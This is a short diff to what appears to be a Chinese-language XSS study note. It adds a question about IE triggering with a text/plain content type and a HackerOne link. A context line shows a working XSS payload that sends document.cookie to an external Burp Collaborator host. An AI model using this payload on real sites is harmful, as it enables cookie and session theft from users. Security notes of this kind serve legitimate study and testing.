@@ -529,7 +529,6 @@ http://drops.wooyun.org/tips/147
 <svg onload=document.location='http://gp913e051giaos37xrsehq7f2681wq.burpcollaborator.net/?cookie='+document.cookie//<<SCRIPT>
 ```
 
-
 ### Ref
  
 - https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
@@ -594,3 +593,9 @@ import org.owasp.encoder.Encode;
 
 Demo:
 ![](imgs/20200814144911.png)
+
+
+
+### 问题
+`Content-Type: text/plain`这样还能在IE下触发？
+https://hackerone.com/reports/472543
